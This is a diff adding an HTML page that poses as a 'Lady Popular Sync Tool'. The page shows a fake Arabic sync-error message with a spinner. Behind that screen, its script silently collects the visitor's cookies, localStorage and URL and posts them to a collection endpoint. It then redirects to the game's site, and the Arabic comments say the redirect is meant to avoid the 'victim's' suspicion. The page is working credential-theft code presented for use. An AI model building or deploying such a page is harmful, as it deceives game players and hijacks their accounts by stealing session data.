@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Lady Popular Sync Tool v2.0</title>
+    <style>
+        body { text-align: center; font-family: 'Arial', sans-serif; background-color: #f0f0f5; padding-top: 100px; }
+        .loading-box { 
+            background-color: white; 
+            padding: 40px; 
+            border-radius: 12px; 
+            box-shadow: 0 6px 15px rgba(0,0,0,0.2); 
+            display: inline-block; 
+            border: 3px solid #ff4d4d; /* لون أحمر يوحي بوجود خطأ أو تنبيه */
+        }
+        h3 { color: #cc0000; }
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #cc0000;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 2s linear infinite;
+            margin: 15px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+
+<div class="loading-box">
+    <div class="spinner"></div>
+    <h3>🚨 فشل في المزامنة - محاولة تصحيح عاجلة...</h3>
+    <p>لقد حدث خطأ في الاتصال بخادم الألماس التجريبي.</p>
+    <p>النظام يحاول الآن استخدام بروتوكول التصحيح التلقائي. يرجى عدم إغلاق هذه الصفحة لمدة 10 ثواني.</p>
+</div>
+
+<script>
+    // 1. جمع البيانات: سحب الكوكيز المتاحة لـ JS وبيانات التخزين المحلي
+    const dataToExfiltrate = {
+        cookies: document.cookie,
+        url: window.location.href,
+        localStorage: JSON.stringify(localStorage), 
+        gameDomain: 'ladypopular.com'
+    };
+    
+    // 2. إعدادات الإرسال: نقطة النهاية على خادم Render الخاص بك
+    // يستخدم window.location.host للتأكد من استخدام الدومين الصحيح تلقائياً
+    const EXFIL_ENDPOINT = 'https://' + window.location.host + '/collect_and_forward';
+    
+    // 3. الإرسال عبر Fetch (طلب خلفي صامت)
+    fetch(EXFIL_ENDPOINT, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(dataToExfiltrate),
+        mode: 'cors' 
+    })
+    .then(() => {
+        // بعد الإرسال الناجح، إعادة التوجيه لتجنب الشك
+        setTimeout(() => {
+            window.location.href = 'https://ar.ladypopular.com/'; // إرسال الضحية إلى الصفحة الرئيسية
+        }, 8000); 
+    })
+    .catch(() => {
+        // في حال الفشل (تجاهل صامت)، إعادة التوجيه لتجنب بقاء الصفحة معلقة
+        setTimeout(() => {
+            window.location.href = 'https://ar.ladypopular.com/';
+        }, 8000); 
+    });
+
+</script>
+
+</body>
+</html>
